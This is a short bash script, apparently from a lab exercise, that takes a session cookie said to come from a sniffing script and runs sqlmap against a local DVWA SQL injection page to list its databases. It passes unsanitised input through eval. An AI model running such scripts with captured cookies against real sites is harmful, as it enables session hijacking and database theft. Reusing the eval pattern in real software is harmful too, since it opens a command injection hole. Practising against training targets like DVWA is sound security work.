#!/bin/bash

# Takes session input from sniff.py
read -p 'Cookie: ' cookie
# define the SQLmap command to run
sqlmap_cmd="sqlmap -u 127.0.0.1/DVWA/vulnerabilities/sqli/?id=asd&Submit=Submit#' --cookie='$cookie'  --dbs --batch"

# execute the SQLmap command and capture the output
output=$(eval $sqlmap_cmd)

# print the output
echo "$output"